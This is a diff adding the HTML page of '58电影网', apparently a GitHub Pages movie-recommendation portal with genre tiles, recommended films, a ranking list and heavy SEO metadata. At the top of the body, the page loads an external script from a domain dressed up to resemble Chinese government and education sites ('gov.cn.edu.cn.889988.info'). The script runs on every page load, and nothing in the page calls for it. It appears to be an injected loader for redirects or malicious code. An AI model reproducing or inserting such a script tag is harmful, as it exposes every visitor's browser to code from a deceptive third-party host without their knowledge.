@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>58电影网 - 影视导航推荐门户 | 58dianyingwang-top.github.io</title>
+<meta name="description" content="58电影网：https://58dianyingwang-top.github.io，影视导航推荐门户，提供热门分类、今日推荐、排行榜等丰富内容，单页自适应，必应收录友好。" />
+<meta name="keywords" content="58电影网, 58dianyingwang-top, 电影导航, 影视推荐, 在线电影" />
+<meta name="author" content="58电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="theme-color" content="#ff6a00" />
+<link rel="canonical" href="https://58dianyingwang-top.github.io/" />
+
+<!-- Open Graph -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="58电影网 - 影视导航推荐门户" />
+<meta property="og:description" content="58电影网：https://58dianyingwang-top.github.io，影视导航推荐门户，提供热门分类、今日推荐、排行榜等。" />
+<meta property="og:url" content="https://58dianyingwang-top.github.io/" />
+<meta property="og:site_name" content="58电影网" />
+
+<!-- Twitter -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="58电影网 - 影视导航推荐门户" />
+<meta name="twitter:description" content="58电影网：https://58dianyingwang-top.github.io，影视导航推荐门户。" />
+
+<!-- JSON-LD -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "58电影网",
+  "url": "https://58dianyingwang-top.github.io/",
+  "description": "58电影网是影视导航推荐门户，提供热门分类、今日推荐、排行榜等丰富影视内容，一站式观影导航。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://58dianyingwang-top.github.io/#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "58电影网",
+  "url": "https://58dianyingwang-top.github.io/",
+  "slogan": "58部好片，总有一部适合你"
+}
+</script>
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+    color: #333;
+    background: #f5f5f5;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+  a { text-decoration: none; color: inherit; }
+
+  /* 顶部色带 */
+  .top-bar {
+    height: 4px;
+    background: linear-gradient(90deg, #ff6a00, #ff9500, #ff6a00);
+    background-size: 200% 100%;
+    animation: bar-slide 3s linear infinite;
+  }
+  @keyframes bar-slide {
+    0% { background-position: 0% 0; }
+    100% { background-position: 200% 0; }
+  }
+
+  /* 导航 */
+  .nav {
+    position: sticky;
+    top: 0;
+    z-index: 999;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 28px;
+    background: #fff;
+    border-bottom: 1px solid #e8e8e8;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+  }
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .brand-num {
+    width: 36px;
+    height: 36px;
+    background: #ff6a00;
+    color: #fff;
+    font-size: 18px;
+    font-weight: 900;
+    display: grid;
+    place-items: center;
+    border-radius: 8px;
+  }
+  .brand-text {
+    font-size: 20px;
+    font-weight: 800;
+    color: #333;
+  }
+  .brand-text span { color: #ff6a00; }
+  .brand small {
+    display: block;
+    font-size: 10px;
+    color: #999;
+    font-weight: 400;
+  }
+  .menu-btn {
+    display: none;
+    font-size: 22px;
+    background: transparent;
+    color: #ff6a00;
+    border: none;
+    width: 40px;
+    height: 40px;
+    cursor: pointer;
+  }
+  .nav-links {
+    list-style: none;
+    display: flex;
+    gap: 4px;
+  }
+  .nav-links a {
+    padding: 8px 16px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #666;
+    border-radius: 6px;
+    transition: all .3s;
+  }
+  .nav-links a:hover {
+    color: #ff6a00;
+    background: rgba(255,106,0,0.08);
+  }
+
+  /* Hero */
+  .hero {
+    position: relative;
+    padding: 60px 24px 50px;
+    text-align: center;
+    max-width: 900px;
+    margin: 0 auto;
+    background: #fff;
+  }
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 16px;
+    background: rgba(255,106,0,0.1);
+    color: #ff6a00;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 20px;
+  }
+  .hero h1 {
+    font-size: 42px;
+    color: #333;
+    margin-bottom: 14px;
+    font-weight: 900;
+  }
+  .hero h1 span { color: #ff6a00; }
+  .hero p {
+    font-size: 16px;
+    color: #666;
+    margin-bottom: 20px;
+    max-width: 640px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  .url-box {
+    display: inline-block;
+    padding: 10px 20px;
+    background: #f8f8f8;
+    border: 1px solid #e0e0e0;
+    color: #ff6a00;
+    font-weight: 600;
+    font-size: 14px;
+    margin-bottom: 24px;
+  }
+  .cta-btn {
+    display: inline-block;
+    padding: 14px 40px;
+    background: #ff6a00;
+    color: #fff;
+    font-weight: 700;
+    font-size: 16px;
+    border-radius: 8px;
+    transition: all .3s;
+    box-shadow: 0 4px 14px rgba(255,106,0,0.35);
+  }
+  .cta-btn:hover {
+    background: #e55e00;
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(255,106,0,0.45);
+  }
+
+  /* 快速导航条 */
+  .quick-nav {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    padding: 16px 24px;
+    background: #fff;
+    border-bottom: 1px solid #e8e8e8;
+    flex-wrap: wrap;
+  }
+  .quick-nav a {
+    padding: 6px 16px;
+    background: #f5f5f5;
+    color: #666;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 500;
+    transition: all .3s;
+  }
+  .quick-nav a:hover {
+    background: #ff6a00;
+    color: #fff;
+  }
+
+  /* 区块通用 */
+  section { padding: 48px 24px; max-width: 1200px; margin: 0 auto; }
+  .sec-head {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 28px;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .sec-head h2 {
+    font-size: 24px;
+    color: #333;
+    font-weight: 800;
+  }
+  .sec-head h2 span { color: #ff6a00; }
+  .sec-head .more {
+    color: #ff6a00;
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  /* 分类磁贴 */
+  .cat-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+  }
+  .cat-tile {
+    background: #fff;
+    border: 1px solid #e8e8e8;
+    border-radius: 12px;
+    padding: 24px 16px;
+    text-align: center;
+    transition: all .3s;
+    cursor: default;
+  }
+  .cat-tile:hover {
+    border-color: #ff6a00;
+    box-shadow: 0 8px 24px rgba(255,106,0,0.12);
+    transform: translateY(-4px);
+  }
+  .cat-tile .cat-icon { font-size: 32px; margin-bottom: 10px; }
+  .cat-tile h3 { font-size: 15px; color: #333; margin-bottom: 4px; font-weight: 700; }
+  .cat-tile p { font-size: 12px; color: #999; }
+
+  /* 今日推荐 */
+  .today-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 20px;
+  }
+  .today-card {
+    background: #fff;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid #e8e8e8;
+    transition: all .3s;
+  }
+  .today-card:hover {
+    box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+    transform: translateY(-3px);
+  }
+  .today-thumb {
+    height: 160px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    color: #fff;
+    font-weight: 900;
+  }
+  .today-card:nth-child(1) .today-thumb { background: linear-gradient(135deg, #ff6a00, #ff9500); }
+  .today-card:nth-child(2) .today-thumb { background: linear-gradient(135deg, #6a5acd, #9370db); }
+  .today-card:nth-child(3) .today-thumb { background: linear-gradient(135deg, #2e8b57, #3cb371); }
+  .today-card:nth-child(4) .today-thumb { background: linear-gradient(135deg, #c0392b, #e74c3c); }
+  .today-card:nth-child(5) .today-thumb { background: linear-gradient(135deg, #2980b9, #3498db); }
+  .today-card:nth-child(6) .today-thumb { background: linear-gradient(135deg, #8e44ad, #9b59b6); }
+  .today-info { padding: 16px; }
+  .today-info h4 { font-size: 15px; color: #333; margin-bottom: 6px; font-weight: 700; }
+  .today-info p { font-size: 12px; color: #999; line-height: 1.6; }
+  .today-tag {
+    display: inline-block;
+    margin-top: 8px;
+    padding: 3px 10px;
+    background: rgba(255,106,0,0.1);
+    color: #ff6a00;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+
+  /* 排行榜 */
+  .rank-section {
+    background: #fff;
+    border-radius: 16px;
+    padding: 32px;
+    border: 1px solid #e8e8e8;
+  }
+  .rank-tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  .rank-tab {
+    padding: 8px 20px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #666;
+    background: #f5f5f5;
+    cursor: default;
+  }
+  .rank-tab.active {
+    background: #ff6a00;
+    color: #fff;
+  }
+  .rank-list { list-style: none; }
+  .rank-list li {
+    display: flex;
+    align-items: center;
+    padding: 14px 0;
+    border-bottom: 1px solid #f0f0f0;
+    gap: 14px;
+  }
+  .rank-list li:last-child { border-bottom: none; }
+  .rank-no {
+    width: 28px;
+    height: 28px;
+    display: grid;
+    place-items: center;
+    font-size: 14px;
+    font-weight: 800;
+    border-radius: 6px;
+    flex-shrink: 0;
+  }
+  .rank-list li:nth-child(1) .rank-no { background: #ff6a00; color: #fff; }
+  .rank-list li:nth-child(2) .rank-no { background: #ff9500; color: #fff; }
+  .rank-list li:nth-child(3) .rank-no { background: #ffb84d; color: #fff; }
+  .rank-list li:nth-child(n+4) .rank-no { background: #f0f0f0; color: #999; }
+  .rank-detail h4 { font-size: 15px; color: #333; font-weight: 600; }
+  .rank-detail p { font-size: 12px; color: #999; }
+  .rank-score {
+    margin-left: auto;
+    font-size: 18px;
+    font-weight: 800;
+    color: #ff6a00;
+  }
+
+  /* 关于 */
+  .about {
+    background: #fff;
+    border-radius: 16px;
+    padding: 40px 32px;
+    text-align: center;
+    border: 1px solid #e8e8e8;
+  }
+  .about h2 { color: #333; margin-bottom: 14px; }
+  .about h2 span { color: #ff6a00; }
+  .about p { max-width: 680px; margin: 0 auto 14px; color: #666; }
+  .about .quote {
+    font-size: 16px;
+    color: #ff6a00;
+    margin: 20px 0;
+    font-weight: 600;
+  }
+  .about .url-show {
+    display: inline-block;
+    padding: 10px 20px;
+    background: #f8f8f8;
+    border: 1px solid #e0e0e0;
+    color: #ff6a00;
+    font-weight: 600;
+    margin-top: 10px;
+  }
+
+  /* 联系 */
+  .contact {
+    text-align: center;
+    padding: 48px 24px;
+  }
+  .contact h2 { color: #333; margin-bottom: 12px; }
+  .contact p { color: #666; margin-bottom: 24px; }
+  .contact .btn {
+    display: inline-block;
+    padding: 14px 40px;
+    background: #ff6a00;
+    color: #fff;
+    font-weight: 700;
+    font-size: 15px;
+    border-radius: 8px;
+    transition: all .3s;
+  }
+  .contact .btn:hover {
+    background: #e55e00;
+    transform: translateY(-2px);
+  }
+
+  footer {
+    text-align: center;
+    padding: 28px 20px 40px;
+    color: #bbb;
+    font-size: 12px;
+    border-top: 1px solid #e8e8e8;
+    background: #fff;
+  }
+
+  /* 移动端 */
+  @media (max-width: 900px) {
+    .cat-grid { grid-template-columns: repeat(2, 1fr); }
+    .today-grid { grid-template-columns: repeat(2, 1fr); }
+  }
+  @media (max-width: 640px) {
+    .menu-btn { display: block; }
+    .nav-links {
+      display: none;
+      position: absolute;
+      top: 64px; left: 0; right: 0;
+      flex-direction: column;
+      gap: 0;
+      background: #fff;
+      border-bottom: 1px solid #e8e8e8;
+      padding: 10px 0;
+    }
+    .nav-links.show { display: flex; }
+    .nav-links a { display: block; text-align: center; padding: 14px 24px; }
+    .cat-grid { grid-template-columns: 1fr 1fr; }
+    .today-grid { grid-template-columns: 1fr; }
+    .hero h1 { font-size: 28px; }
+    .rank-section { padding: 20px; }
+    .rank-list li { flex-wrap: wrap; }
+    .rank-score { margin-left: 0; }
+  }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="top-bar"></div>
+
+<nav class="nav">
+  <div class="brand">
+    <div class="brand-num">58</div>
+    <div>
+      <div class="brand-text">58<span>电影网</span></div>
+      <small>58dianyingwang-top.github.io</small>
+    </div>
+  </div>
+  <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('navLinks').classList.toggle('show')">☰</button>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">首页</a></li>
+    <li><a href="#categories">热门分类</a></li>
+    <li><a href="#today">今日推荐</a></li>
+    <li><a href="#rank">排行榜</a></li>
+    <li><a href="#about">关于58</a></li>
+    <li><a href="#contact">联系我们</a></li>
+  </ul>
+</nav>
+
+<div class="quick-nav">
+  <a href="#categories">动作</a>
+  <a href="#categories">喜剧</a>
+  <a href="#categories">爱情</a>
+  <a href="#categories">科幻</a>
+  <a href="#categories">悬疑</a>
+  <a href="#categories">动画</a>
+  <a href="#categories">纪录片</a>
+  <a href="#categories">恐怖</a>
+</div>
+
+<header class="hero" id="home">
+  <div class="hero-badge">🎬 影视导航推荐门户</div>
+  <h1><span>58</span>电影网</h1>
+  <p>
+    58电影网（https://58dianyingwang-top.github.io）是一个影视导航推荐门户。
+    我们汇聚热门分类、今日精选、实时排行榜，为你提供一站式观影导航服务。
+    58部好片，总有一部适合你。
+  </p>
+  <div class="url-box">🌐 网站网址：https://58dianyingwang-top.github.io</div>
+  <br />
+  <a class="cta-btn" href="#categories">开始浏览</a>
+</header>
+
+<section id="categories">
+  <div class="sec-head">
+    <h2>热门<span>分类</span></h2>
+    <a class="more" href="#">全部 →</a>
+  </div>
+  <div class="cat-grid">
+    <div class="cat-tile">
+      <div class="cat-icon">💥</div>
+      <h3>动作</h3>
+      <p>热血激战，燃爆全场</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">😂</div>
+      <h3>喜剧</h3>
+      <p>开怀大笑，烦恼全消</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">💕</div>
+      <h3>爱情</h3>
+      <p>甜蜜心动，浪漫满分</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">🚀</div>
+      <h3>科幻</h3>
+      <p>脑洞大开，未来已来</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">🔍</div>
+      <h3>悬疑</h3>
+      <p>烧脑推理，真相只有一个</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">🎨</div>
+      <h3>动画</h3>
+      <p>奇幻世界，童心未泯</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">📹</div>
+      <h3>纪录片</h3>
+      <p>真实记录，看见世界</p>
+    </div>
+    <div class="cat-tile">
+      <div class="cat-icon">👻</div>
+      <h3>恐怖</h3>
+      <p>惊悚刺激，胆量挑战</p>
+    </div>
+  </div>
+</section>
+
+<section id="today">
+  <div class="sec-head">
+    <h2>今日<span>推荐</span></h2>
+    <a class="more" href="#">更多 →</a>
+  </div>
+  <div class="today-grid">
+    <div class="today-card">
+      <div class="today-thumb">1</div>
+      <div class="today-info">
+        <h4>奥本海默</h4>
+        <p>诺兰执导，原子弹之父的传奇人生，IMAX摄影震撼呈现。</p>
+        <span class="today-tag">传记 · 历史</span>
+      </div>
+    </div>
+    <div class="today-card">
+      <div class="today-thumb">2</div>
+      <div class="today-info">
+        <h4>蜘蛛侠：纵横宇宙</h4>
+        <p>多元宇宙大爆发，视觉风格前所未见，动画巅峰之作。</p>
+        <span class="today-tag">动画 · 科幻</span>
+      </div>
+    </div>
+    <div class="today-card">
+      <div class="today-thumb">3</div>
+      <div class="today-info">
+        <h4>流浪地球2</h4>
+        <p>中国科幻里程碑，宏大叙事与细腻情感完美结合。</p>
+        <span class="today-tag">科幻 · 灾难</span>
+      </div>
+    </div>
+    <div class="today-card">
+      <div class="today-thumb">4</div>
+      <div class="today-info">
+        <h4>消失的她</h4>
+        <p>悬疑反转不断，东南亚风情下的惊天阴谋。</p>
+        <span class="today-tag">悬疑 · 犯罪</span>
+      </div>
+    </div>
+    <div class="today-card">
+      <div class="today-thumb">5</div>
+      <div class="today-info">
+        <h4>封神第一部</h4>
+        <p>东方奇幻史诗，视觉特效与传统文化碰撞。</p>
+        <span class="today-tag">奇幻 · 动作</span>
+      </div>
+    </div>
+    <div class="today-card">
+      <div class="today-thumb">6</div>
+      <div class="today-info">
+        <h4>年会不能停！</h4>
+        <p>职场喜剧黑马，打工人真实写照，笑中带泪。</p>
+        <span class="today-tag">喜剧 · 职场</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="rank">
+  <div class="sec-head">
+    <h2>实时<span>排行榜</span></h2>
+    <a class="more" href="#">完整榜单 →</a>
+  </div>
+  <div class="rank-section">
+    <div class="rank-tabs">
+      <div class="rank-tab active">🔥 热播榜</div>
+      <div class="rank-tab">⭐ 评分榜</div>
+      <div class="rank-tab">🆕 新片榜</div>
+    </div>
+    <ul class="rank-list">
+      <li>
+        <div class="rank-no">1</div>
+        <div class="rank-detail">
+          <h4>肖申克的救赎</h4>
+          <p>希望让人自由 · 1994</p>
+        </div>
+        <div class="rank-score">9.7</div>
+      </li>
+      <li>
+        <div class="rank-no">2</div>
+        <div class="rank-detail">
+          <h4>阿甘正传</h4>
+          <p>人生就像一盒巧克力 · 1994</p>
+        </div>
+        <div class="rank-score">9.5</div>
+      </li>
+      <li>
+        <div class="rank-no">3</div>
+        <div class="rank-detail">
+          <h4>泰坦尼克号</h4>
+          <p>永恒的经典爱情 · 1997</p>
+        </div>
+        <div class="rank-score">9.4</div>
+      </li>
+      <li>
+        <div class="rank-no">4</div>
+        <div class="rank-detail">
+          <h4>盗梦空间</h4>
+          <p>梦中梦的终极挑战 · 2010</p>
+        </div>
+        <div class="rank-score">9.3</div>
+      </li>
+      <li>
+        <div class="rank-no">5</div>
+        <div class="rank-detail">
+          <h4>星际穿越</h4>
+          <p>爱穿越时空 · 2014</p>
+        </div>
+        <div class="rank-score">9.3</div>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<section id="about" class="about">
+  <h2>关于<span>58电影网</span></h2>
+  <p>
+    58电影网（https://58dianyingwang-top.github.io）是一个以"丰富、实用、便捷"为核心的影视导航门户。
+    我们致力于为影迷提供全面、及时的影视信息导航服务，从热门分类到今日推荐，
+    从实时排行榜到个性化片单，让找片不再困难。
+  </p>
+  <div class="quote">"58部好片，总有一部适合你。"</div>
+  <p style="font-size:13px; color:#999;">
+    网站采用单页设计，移动端友好，内容聚焦健康、合规的影视推荐。
+    不堆砌垃圾关键词，不采集低质内容，只做有价值的影视导航。
+  </p>
+  <div class="url-show">🌐 58dianyingwang-top.github.io</div>
+</section>
+
+<section id="contact" class="contact">
+  <h2>联系我们</h2>
+  <p>影片推荐、合作交流、友情链接，欢迎联系58电影网！</p>
+  <a class="btn" href="#home">回到首页</a>
+  <p style="margin-top:24px;font-size:12px;color:#999;">
+    网站名称：58电影网 ｜ 网站网址：https://58dianyingwang-top.github.io
+  </p>
+</section>
+
+<footer>
+  © 2026 58电影网 · 58dianyingwang-top.github.io · 影视导航推荐门户
+</footer>
+
+<script>
+  document.querySelectorAll('#navLinks a').forEach(function(a) {
+    a.addEventListener('click', function() {
+      document.getElementById('navLinks').classList.remove('show');
+    });
+  });
+</script>
+
+</body>
+</html>
